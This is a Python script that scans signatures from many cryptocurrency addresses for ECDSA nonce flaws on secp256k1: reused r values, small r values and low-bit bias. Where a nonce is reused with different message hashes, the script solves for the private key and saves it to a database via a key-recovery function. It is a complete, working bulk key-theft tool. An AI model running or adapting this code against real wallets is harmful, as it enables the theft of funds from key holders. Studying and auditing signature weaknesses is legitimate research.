import json
from collections import Counter
from db_manager import get_signatures, find_all_addresses, add_finding, get_connection, add_recovered_key

# SECP256K1 Curve Order
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def solve_r_reuse(s1, z1, s2, z2, r):
    try:
        # k = (z1 - z2) / (s1 - s2) mod P
        k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
        # d = (s1 * k - z1) / r mod P
        d = ((s1 * k - z1) * pow(r, -1, P)) % P
        return d
    except Exception as e:
        print(f"Error solving R-reuse: {e}")
        return None

def check_r_reuse(address):
    sigs = get_signatures(address)
    if len(sigs) < 2: return False
    
    # Use a dictionary to group by R
    r_groups = {}
    for sig in sigs:
        r = sig['r']
        if r not in r_groups: r_groups[r] = []
        r_groups[r].append(sig)
    
    found = False
    for r, group in r_groups.items():
        if len(group) > 1:
            # Check if any two have different Z
            for i in range(len(group)):
                for j in range(i + 1, len(group)):
                    if group[i]['z'] != group[j]['z']:
                        print(f"!!! CRITICAL: R-REUSE WITH DIFFERENT Z for {address} !!!")
                        privkey = solve_r_reuse(group[i]['s'], group[i]['z'], 
                                               group[j]['s'], group[j]['z'], r)
                        if privkey:
                            privkey_hex = hex(privkey)[2:].zfill(64)
                            print(f"!!! SUCCESS: Key recovered via R-reuse: {privkey_hex}")
                            add_recovered_key(address, privkey_hex, method='R-Reuse')
                            return True # Found it!
            
            # If all Z are the same, it's still a reuse but not immediately exploitable
            txids = list(set([sig['txid'] for sig in group]))
            print(f"!!! R-REUSE (Same Z) for {address} !!!")
            add_finding(address, 'R-Reuse (Same Z)', txid=txids[0], details={'r_hex': hex(r), 'txids': txids}, severity='Medium')
            found = True
    return found

def check_small_r(address):
    sigs = get_signatures(address)
    found = False
    for sig in sigs:
        r_int = sig['r']
        r_bits = r_int.bit_length()
        if r_bits < 160: # Threshold for "small" r
            print(f"!!! SMALL R DETECTED for {address} ({r_bits} bits) !!!")
            add_finding(address, 'Small R', txid=sig['txid'], details={'r_bits': r_bits, 'r_hex': hex(r_int)}, severity='High' if r_bits < 128 else 'Medium')
            found = True
    return found

def check_lsb_bias(address):
    sigs = get_signatures(address)
    if len(sigs) < 4: return False
    
    r_values = [sig['r'] for sig in sigs]
    found = False
    for bits in range(1, 13):
        mod = 1 << bits
        counts = Counter([r % mod for r in r_values])
        for val, count in counts.items():
            if count >= len(r_values) * 0.8: # 80% threshold
                print(f"!!! LSB BIAS DETECTED for {address} at {bits} bits (mod {mod} = {val}) !!!")
                add_finding(address, 'LSB Bias', details={'bits': bits, 'mod': mod, 'val': val, 'count': count, 'total': len(r_values)}, severity='High')
                found = True
    return found

def run_all_checks():
    addresses = find_all_addresses()
    print(f"Running vulnerability checks on {len(addresses)} addresses...")
    
    stats = {'r_reuse': 0, 'small_r': 0, 'lsb_bias': 0}
    
    for addr in addresses:
        if check_r_reuse(addr): stats['r_reuse'] += 1
        if check_small_r(addr): stats['small_r'] += 1
        if check_lsb_bias(addr): stats['lsb_bias'] += 1
        
    print("\nSummary:")
    print(f"R-Reuse found: {stats['r_reuse']}")
    print(f"Small R found: {stats['small_r']}")
    print(f"LSB Bias found: {stats['lsb_bias']}")

if __name__ == "__main__":
    run_all_checks()
